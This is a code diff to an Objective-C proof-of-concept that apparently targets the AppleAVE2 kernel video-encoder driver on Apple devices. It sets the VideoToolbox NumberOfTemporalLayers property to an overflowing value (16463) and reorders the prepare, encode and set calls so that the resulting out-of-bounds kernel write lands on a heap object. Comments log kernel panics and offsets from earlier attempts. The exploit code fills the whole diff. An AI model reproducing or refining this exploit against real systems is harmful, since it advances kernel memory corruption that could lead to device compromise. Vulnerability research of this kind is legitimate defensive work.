@@ -8,8 +8,9 @@
 //  encode → complete → invalidate). The knob = NumberOfTemporalLayers via
 //  VTSessionSetProperty with the plain-string key (the PoC's property).
 //
-//  v6: Prepare N=8 first (real Surface Pool), then Set the overshoot,
-//  then encode. v5 set-then-Prepare is the this=1 / FAR=0x59 path.
+//  v7: Prepare N=8, encode >=1 frame (materialize heap this at
+//  ctx+0x147b0), THEN Set the overshoot, encode again, invalidate.
+//  v6 Set-then-encode left this=1 FAR=0x59 at dtor (IPS 13:45-13:55).
 //
 //  HONESTY: kernel WRITE state-manipulation probe (count-scaled fill);
 //  panic = the count-law receipt, BY DESIGN; one value per tap;
@@ -35,7 +36,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P142_BUILD   @"p142-avetemporal-v6-prepare-first"
+#define P142_BUILD   @"p142-avetemporal-v7-encode-first"
 #define P142_KEY     @"NumberOfTemporalLayers"
 #define P142_DEFAULT 16463         /* the PoC's trigger threshold */
 #define P142_SURVIVE 16462         /* the PoC's surviving value */
@@ -87,8 +88,8 @@ static void p142_bandit(const char *outcome) {
     L(@"  per tap; knob = Documents/p142_layers.txt (decimal).");
     L(@"  blank = 16463 PoC row. 0 = 16462 survival. 16463 = panic row.");
     L(@"  1..16461 cannot hit the OOB (09:06 live: layers=18 readback=1).");
-    L(@"  v6 = Prepare N=8 FIRST (real Surface Pool), THEN Set 16463,");
-    L(@"  THEN encode. v5 set-then-Prepare produced this=1 FAR=0x59.");
+    L(@"  v7 = Encode N=8 FIRST (heap this at ctx+0x147b0), THEN Set");
+    L(@"  16463, THEN encode. v6 Set-then-encode left this=1 FAR=0x59.");
     L(@"  T8150 24A435: rc=-12900 is VT RCMode=20 miss, NOT the 27.2 NTL");
     L(@"  kernel pre-check. Nov 1 panics (5x, videocodecd, AppleAVE2");
     L(@"  913.43.1 +0xDA78 far=0x59) fired with that same rc=-12900.");
@@ -156,9 +157,7 @@ static void p142_bandit(const char *outcome) {
     VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                          kCFBooleanFalse);
     CFStringRef key = (__bridge CFStringRef)P142_KEY;
-    /* v6: Prepare with an in-bounds count so the Surface Pool ctor
-       gets a real `this`, then Set the overshoot onto the live context.
-       v5 set-then-Prepare is the this=1 / FAR=0x59 path. */
+    /* v7: Prepare + encode at N=8 first (heap this), then overshoot. */
     int32_t pre32 = (int32_t)pre;
     CFNumberRef preVal = CFNumberCreate(kCFAllocatorDefault,
                                         kCFNumberSInt32Type, &pre32);
@@ -174,40 +173,7 @@ static void p142_bandit(const char *outcome) {
     }
 
     st = VTCompressionSessionPrepareToEncodeFrames(session);
-    Lf(@"[3] Prepare st=%d (real Surface Pool; this must not be 1)", (int)st);
-
-    int32_t lay32 = (int32_t)layers;
-    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
-                                     kCFNumberSInt32Type, &lay32);
-    st = VTSessionSetProperty(session, key, val);
-    CFRelease(val);
-    Lf(@"[3b] IN FLIGHT SetProperty(NTL overshoot=%ld) st=%d", layers, (int)st);
-    if ((int)st == -12900) {
-        L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check (this SKU");
-        L(@"  should not show that on 24A435).");
-    }
-
-    /* the readback: the stage9 row after the overshoot set */
-    {
-        void *rb = NULL;
-        OSStatus rst = VTSessionCopyProperty(session, key,
-                                             kCFAllocatorDefault, &rb);
-        if (rst == 0 && rb) {
-            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
-                                             kCFNumberSInt32Type, &rv);
-            Lf(@"[3c] readback = %d (16463 = VT stored the raw count;"
-               @" 1 = VT store clamp; 0 = dropped)", rv);
-            if (rv == 1 && layers > 1) {
-                L(@"[law] readback=1 is VT's store. T8150 24A435 still delivers");
-                L(@"  the internal count to AppleAVE2 (Nov 1: 5 panics at");
-                L(@"  +0xDA78 far=0x59 with readback-class clamp). Hunt 12");
-                L(@"  23F77 stays at readback=1 with no panic = other kext.");
-            }
-            CFRelease(rb);
-        } else {
-            Lf(@"[3c] readback st=%d", (int)rst);
-        }
-    }
+    Lf(@"[3] Prepare st=%d", (int)st);
 
     CVPixelBufferRef pb = NULL;
     st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
@@ -220,16 +186,56 @@ static void p142_bandit(const char *outcome) {
     }
 
     OSStatus firstSt = 0;
-    for (int i = 0; i < 4; i++) {
+    for (int i = 0; i < 2; i++) {
         VTEncodeInfoFlags flags = 0;
         OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
             CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
         if (i == 0) firstSt = est;
-        if (i == 0) L(@"[4] ENCODE[0] = the PoC's panic point (IN FLIGHT)");
         if (est != 0) break;
     }
-    Lf(@"[4] battery returned; first st=%d (a clean return + a nonzero"
-       @" readback = the RAW count law landed)", (int)firstSt);
+    Lf(@"[3a] ENCODE N=%ld (materialize pool) first st=%d", pre, (int)firstSt);
+
+    int32_t lay32 = (int32_t)layers;
+    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
+                                     kCFNumberSInt32Type, &lay32);
+    st = VTSessionSetProperty(session, key, val);
+    CFRelease(val);
+    Lf(@"[3b] IN FLIGHT SetProperty(NTL overshoot=%ld) st=%d", layers, (int)st);
+    if ((int)st == -12900) {
+        L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check (this SKU");
+        L(@"  should not show that on 24A435).");
+    }
+
+    {
+        void *rb = NULL;
+        OSStatus rst = VTSessionCopyProperty(session, key,
+                                             kCFAllocatorDefault, &rb);
+        if (rst == 0 && rb) {
+            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
+                                             kCFNumberSInt32Type, &rv);
+            Lf(@"[3c] readback = %d (16463 = VT stored the raw count;"
+               @" 1 = VT store clamp; 0 = dropped)", rv);
+            if (rv == 1 && layers > 1) {
+                L(@"[law] readback=1 is VT's store. T8150 24A435 still delivers");
+                L(@"  the internal count to AppleAVE2 (Nov 1 / 13:45 IPS:");
+                L(@"  +0xDA78 far=0x59 this=1). Encode-first aims for a heap this.");
+            }
+            CFRelease(rb);
+        } else {
+            Lf(@"[3c] readback st=%d", (int)rst);
+        }
+    }
+
+    OSStatus overSt = 0;
+    for (int i = 2; i < 4; i++) {
+        VTEncodeInfoFlags flags = 0;
+        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
+        if (i == 2) overSt = est;
+        if (i == 2) L(@"[4] ENCODE overshoot on a materialized pool (IN FLIGHT)");
+        if (est != 0) break;
+    }
+    Lf(@"[4] overshoot encode first st=%d", (int)overSt);
     VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
 
     CVPixelBufferRelease(pb);
